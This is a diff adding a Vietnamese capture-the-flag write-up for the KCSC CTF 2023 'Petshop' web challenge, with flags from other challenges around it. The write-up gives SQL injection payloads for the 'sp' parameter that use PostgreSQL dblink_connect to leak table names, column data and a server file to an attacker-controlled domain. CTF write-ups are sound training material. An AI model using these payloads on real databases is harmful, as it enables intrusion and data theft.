@@ -145,6 +145,65 @@ Kết quả:
 
 Flag: `KCSC{https://www.youtube.com/watch?v=A5OLaBlQP9I}`
 
+# Petshop (WEB)
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/570e8b9a-4602-46bd-bdbb-82fe558ef121)
+
+## Description
+Chall cung cấp một URL dẫn tới một trang web bán thú cưng
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/e780f3a8-e2b2-410c-b8d3-81ed38958302)
+
+Ở đây có một chức năng tìm kiếm đã bị disible, ta sẽ enable chức năng này bằng dev tool 
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/d741cc1d-6c6e-4b25-9e7c-3edce2ee8984)
+
+Sau khi nhập input và ấn gửi, dữ liệu sẽ được truyền lên param `sp`. Ở đây có xuất hiện lỗi SQL Injection, nhưng có đặc điểm là kết quả của câu truy vấn sẽ được trả về sau khi reload lại trang thêm 1 lần
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/eb6133d8-3e01-474f-8ce3-9d59345a99c3)
+
+Do ở description chall có từ khóa cá voi nên có thể suy ra db đang sử dụng là PostgreSQL (logo hình cá voi)
+
+Sử dụng kỹ thuật OOB PostgreSQL bằng dblink_connect:
+Payload: 
+```?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT tablename from pg_tables limit 1) , '.[YOUR_DOMAIN] user=a password=a '))--```
+Thực hiện dump table `searches` do còn lại là table default của database:
+
+Dump tên cột
+```?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT column_name from information_schema.columns where table_name = 'searches' limit 1 offset 0) , '.[YOUR_DOMAIN] user=a password=a '```
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/537a95e7-ccdc-4f5e-a417-b8e033641672)
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/fb079110-571b-48d1-88fb-f818bd69f3ab)
+
+Có hai column là `id` và `search`
+
+Thực hiện dump data từ search
+Payload lấy data từ column search: 
+```?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT substring(search,1,51) from searches) , '.[YOUR_DOMAIN] user=a password=a '))-- -```
+
+Kết quả:
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/e171ed13-88f4-4cf9-9a4e-7274d683e2b8)
+
+Ta thu được một đoạn data được decode base64, thực hiện decode được:
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/a90ebcf1-23f8-4e40-bddf-b909fca5cfd3)
+
+`/var/lib/postgresql/data/sqlOutOfBand` : Đây là file binary, thực hiện chạy file này bằng `pg_read_binary_file`
+
+Payload:
+
+`?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT pg_read_binary_file ('/var/lib/postgresql/data/sqlOutOfBand')) , '.[YOUR_DOMAIN] user=a password=a '))-- -`
+
+Kết quả:
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/f6851a48-9b2a-47cc-be59-b77ef82e7345)
+
+Thực hiện convert đoạn hexa này sang text:
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b01c509b-f065-453f-a520-8166703d937e)
+
+Flag: `KCSC{Yeah_Ban_Lam_Duoc_Roi!!!}`
+
 # Discord check (MISC)
 
 ![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/14a1f85c-5ec3-49b9-914d-5952dcd8cfcd)
@@ -272,7 +331,3 @@ Sửa một chút css để xem avatar:
 ![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/9718f32b-2edf-4acb-8e60-356f97183c6d)
 
 Flag: `KCSC{3m4iL_t0_TumbRL???_1b8ad0}`
-
-
-
-
